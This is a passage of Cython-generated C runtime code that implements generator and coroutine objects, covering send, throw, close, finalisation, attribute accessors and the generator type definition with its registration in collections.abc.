    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(CYTHON_UNUSED PyObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(CYTHON_UNUSED PyObject *gen, PyObject *value, CYTHON_UNUSED int closing) {
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_type) {
        #if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
        #else
        if (exc_state->exc_traceback) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_state->exc_traceback;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body((PyObject *) self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *exc_tb = exc_state->exc_traceback;
    if (likely(exc_tb)) {
#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_PYSTON
#else
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
#endif
    }
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(CYTHON_UNUSED PyObject* gen, PyObject *retval) {
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
            _PyGen_SetStopIterationValue(result);
        }
        Py_CLEAR(result);
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = Py_TYPE(yf)->tp_iternext(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                PyErr_WriteUnraisable(yf);
            }
            PyErr_Clear();
        } else {
            retval = PyObject_CallFunction(meth, NULL);
            Py_DECREF(meth);
            if (!retval)
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = Py_TYPE(yf)->tp_iternext(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, CYTHON_UNUSED PyObject *arg) {
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStr(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (!PyErr_ExceptionMatches(PyExc_AttributeError)) {
                    gen->is_running = 0;
                    return NULL;
                }
                PyErr_Clear();
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = PyObject_CallObject(meth, args);
            } else {
                ret = PyObject_CallFunctionObjArgs(meth, typ, val, tb, NULL);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (PyObject_CallFinalizerFromDealloc(self))
#else
        Py_TYPE(gen)->tp_del(self);
        if (Py_REFCNT(self) > 0)
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    PyObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (--self->ob_refcnt == 0) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_name;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_name;
    Py_INCREF(value);
    self->gi_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *name = self->gi_qualname;
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = self->gi_qualname;
    Py_INCREF(value);
    self->gi_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, CYTHON_UNUSED void *context)
{
    PyObject *frame = self->gi_frame;
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            
            (PyCodeObject*) self->gi_code,  
            __pyx_d,                 
            0                               
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}


static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}


#ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (!module) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}


static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_Generator_init(void) {
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}


static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
